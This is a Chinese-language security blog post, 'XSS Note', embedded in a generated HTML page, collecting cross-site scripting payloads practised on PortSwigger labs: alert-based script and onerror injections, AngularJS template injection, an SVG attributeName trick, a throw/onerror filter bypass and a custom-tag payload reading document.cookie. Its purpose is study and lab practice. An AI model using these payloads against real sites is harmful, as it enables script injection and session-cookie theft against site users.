@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Before all這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：Port Swiggerp.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;   Note:Basic Payloads:來複習一下(～￣▽￣)～For HTML:   1234&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;img src&#x3D;&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS Note">
+<meta property="og:url" content="http://wha13.github.io/2023/12/23/xss-note/index.html">
+<meta property="og:site_name" content="Whale120&#39;s Blog">
+<meta property="og:description" content="Before all這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：Port Swiggerp.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;   Note:Basic Payloads:來複習一下(～￣▽￣)～For HTML:   1234&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&lt;img src&#x3D;&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-12-24T01:31:04.000Z">
+<meta property="article:modified_time" content="2024-07-25T09:30:32.267Z">
+<meta property="article:author" content="William Lin">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="Note">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>XSS Note</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2023/12/31/2023FINAL/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/12/13/msfconsole/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/12/23/xss-note/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/12/23/xss-note/&text=XSS Note"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/12/23/xss-note/&is_video=false&description=XSS Note"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS Note&body=Check out this article: http://wha13.github.io/2023/12/23/xss-note/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/12/23/xss-note/&name=XSS Note&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/12/23/xss-note/&t=XSS Note"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-number">2.</span> <span class="toc-text">Note:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-Payloads"><span class="toc-number">2.1.</span> <span class="toc-text">Basic Payloads:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-Encode-Trick"><span class="toc-number">2.2.</span> <span class="toc-text">HTML Encode Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Angular-js"><span class="toc-number">2.3.</span> <span class="toc-text">Angular js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blocked-html-tags"><span class="toc-number">2.4.</span> <span class="toc-text">Blocked html tags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backtick-Injection"><span class="toc-number">2.5.</span> <span class="toc-text">Backtick Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-attributeName"><span class="toc-number">2.6.</span> <span class="toc-text">XML attributeName</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js-throw"><span class="toc-number">2.7.</span> <span class="toc-text">js throw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        XSS Note
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">William Lin</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-24T01:31:04.000Z" class="dt-published" itemprop="datePublished">2023-12-23</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Note/" rel="tag">Note</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/XSS/" rel="tag">XSS</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Before-all"><a href="#Before-all" class="headerlink" title="Before all"></a>Before all</h2><p>這邊主要是紀錄我打XSS時學到的一些神奇招數，基本的XSS還是要到這邊看喔：<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting#what-is-cross-site-scripting-xss">Port Swigger</a><br>p.s.其實這些題目後面也都是從port swigger來ㄉ &gt;&lt;  </p>
+<h2 id="Note"><a href="#Note" class="headerlink" title="Note:"></a>Note:</h2><h3 id="Basic-Payloads"><a href="#Basic-Payloads" class="headerlink" title="Basic Payloads:"></a>Basic Payloads:</h3><p>來複習一下(～￣▽￣)～<br><strong>For HTML:</strong>  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(1)&#x27;</span>&gt;</span></span><br><span class="line">&#x27;;-alert(1)-;&#x27;</span><br><span class="line">blablalba</span><br></pre></td></tr></table></figure>
+<p><strong>Javascript Injection:</strong>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;);alert(1);\\</span></span><br><span class="line"><span class="string">blablabla</span></span><br></pre></td></tr></table></figure>
+<p><strong>DOM Base:</strong><br>是觸發於<code>document.write</code>這類寫入函數的弱點。<br>開啟Burp Suite Browser的f12工具列，找到DOM Invader，搜尋自己的input然後構造payload，後面就跟前面一樣ㄌ  </p>
+<h3 id="HTML-Encode-Trick"><a href="#HTML-Encode-Trick" class="headerlink" title="HTML Encode Trick"></a>HTML Encode Trick</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apos;-<span class="title function_">alert</span>(<span class="number">1</span>)-&amp;apos;</span><br></pre></td></tr></table></figure>
+<h3 id="Angular-js"><a href="#Angular-js" class="headerlink" title="Angular js"></a>Angular js</h3><p>Angular js 會去抓取格式如<code>&#123;&#123;&#125;&#125;</code>的東西當作模板去做處理，就跟SSTI一樣。<br><strong>Payloads</strong><br><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md">Angular js SSTI Payloads on Github</a>  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;$on.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;alert(1)&#x27;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="Blocked-html-tags"><a href="#Blocked-html-tags" class="headerlink" title="Blocked html tags"></a>Blocked html tags</h3><p>第一個想法一定是暴力看看有那些tags和arguments可以用<br><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">Payload List on Port Swigger</a><br>如果都不行的話，構造一個不存在的tag然後利用id+onfocus以及url fragment(<code>#</code>)去觸發XSS：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;xss+id=x+onfocus=<span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>) tabindex=<span class="number">1</span>&gt;#x<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Backtick-Injection"><a href="#Backtick-Injection" class="headerlink" title="Backtick Injection"></a>Backtick Injection</h3><p>透過使用如<code>$&#123;&#125;</code>的方式去呼叫js，一樣是一種SSTI(?)</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;<span class="title function_">alert</span>(<span class="number">1</span>)&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="XML-attributeName"><a href="#XML-attributeName" class="headerlink" title="XML attributeName"></a>XML attributeName</h3><p>利用XML attributeName去改掉父標籤屬性。  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="tag">&lt;<span class="name">a</span>&gt;</span>&lt;animate+attributeName=href+values=javascript:alert(1)+/&gt;&lt;text+x=20+y=20&gt;Click me<span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="js-throw"><a href="#js-throw" class="headerlink" title="js throw"></a>js throw</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-url-some-characters-blocked">lab</a>  </p>
+<ul>
+<li>利用資料解析方式的不同去觸發injection</li>
+</ul>
+<p>throw+onerror可以觸發一系列行為。  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span>&amp;<span class="string">&#x27;&#125;,x=x=&gt;&#123;throw/**/onerror=alert,1337&#125;,toString=x,window+&#x27;</span><span class="string">&#x27;,&#123;x:&#x27;</span></span><br></pre></td></tr></table></figure>
+<h2 id="After-all"><a href="#After-all" class="headerlink" title="After all"></a>After all</h2><p>應該還有些東西要補(  </p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Before-all"><span class="toc-number">1.</span> <span class="toc-text">Before all</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Note"><span class="toc-number">2.</span> <span class="toc-text">Note:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Basic-Payloads"><span class="toc-number">2.1.</span> <span class="toc-text">Basic Payloads:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML-Encode-Trick"><span class="toc-number">2.2.</span> <span class="toc-text">HTML Encode Trick</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Angular-js"><span class="toc-number">2.3.</span> <span class="toc-text">Angular js</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Blocked-html-tags"><span class="toc-number">2.4.</span> <span class="toc-text">Blocked html tags</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Backtick-Injection"><span class="toc-number">2.5.</span> <span class="toc-text">Backtick Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML-attributeName"><span class="toc-number">2.6.</span> <span class="toc-text">XML attributeName</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#js-throw"><span class="toc-number">2.7.</span> <span class="toc-text">js throw</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#After-all"><span class="toc-number">3.</span> <span class="toc-text">After all</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://wha13.github.io/2023/12/23/xss-note/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://wha13.github.io/2023/12/23/xss-note/&text=XSS Note"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wha13.github.io/2023/12/23/xss-note/&is_video=false&description=XSS Note"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=XSS Note&body=Check out this article: http://wha13.github.io/2023/12/23/xss-note/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://wha13.github.io/2023/12/23/xss-note/&title=XSS Note"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://wha13.github.io/2023/12/23/xss-note/&name=XSS Note&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://wha13.github.io/2023/12/23/xss-note/&t=XSS Note"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2023-2025
+    William Lin
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
